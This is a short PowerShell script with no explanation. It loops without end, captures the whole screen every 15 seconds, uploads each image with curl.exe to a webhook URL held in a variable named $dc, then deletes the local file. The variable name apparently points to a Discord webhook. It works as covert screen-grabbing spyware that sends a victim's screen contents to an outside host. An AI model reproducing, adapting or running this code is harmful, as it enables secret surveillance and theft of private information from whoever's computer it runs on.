$hookurl = $dc
$seconds = 15
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
while ($true) {
    $Filett = "$env:temp\SC.png"
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::Png)
    curl.exe -F "file1=@$Filett" $hookurl
    Remove-Item -Path $Filett
    Start-Sleep $seconds
}
